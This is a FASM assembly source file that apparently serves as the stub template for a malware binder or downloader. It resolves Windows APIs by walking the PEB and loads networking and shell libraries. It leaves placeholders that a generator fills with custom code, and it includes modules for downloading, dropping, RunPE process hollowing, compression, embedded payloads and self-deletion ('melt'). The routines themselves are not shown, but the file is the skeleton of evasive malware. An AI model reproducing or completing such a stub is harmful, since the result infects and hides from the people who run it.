format PE GUI 4.0
entry Main

include 'win32wx.inc'
include 'nt.inc'
include 'PebApi.inc'

section '.text' code readable executable

proc Main
	local	DllName[MAX_PATH + 1]:WORD
	local	Payload:DWORD
	local	PayloadSize:DWORD

	; LoadLibrary user32.dll
	lea		eax, [DllName]
	lodstrw	'user32.dll'
	pebcall	PEB_Kernel32Dll, PEB_LoadLibraryW, eax

	; LoadLibrary shell32.dll
	lea		eax, [DllName]
	lodstrw	'shell32.dll'
	pebcall	PEB_Kernel32Dll, PEB_LoadLibraryW, eax

	; LoadLibrary shlwapi.dll
	lea		eax, [DllName]
	lodstrw	'shlwapi.dll'
	pebcall	PEB_Kernel32Dll, PEB_LoadLibraryW, eax

	; LoadLibrary wininet.dll
	lea		eax, [DllName]
	lodstrw	'wininet.dll'
	pebcall	PEB_Kernel32Dll, PEB_LoadLibraryW, eax

	; ==========================================================================
	; == Custom assembly                                                      ==
	; ==========================================================================

	;{MAIN}

	; ==========================================================================
	; == End of custom assembly                                               ==
	; ==========================================================================
.ret:

	;{MELT}

	pebcall	PEB_Kernel32Dll, PEB_ExitProcess, 0
	ret
endp

include 'PebApi.asm'
include 'Melt.asm'
include 'Compression.asm'
include 'Download.asm'
include 'RunPE.asm'
include 'Drop.asm'

include 'EmbeddedStrings.inc'
include 'EmbeddedSources.inc'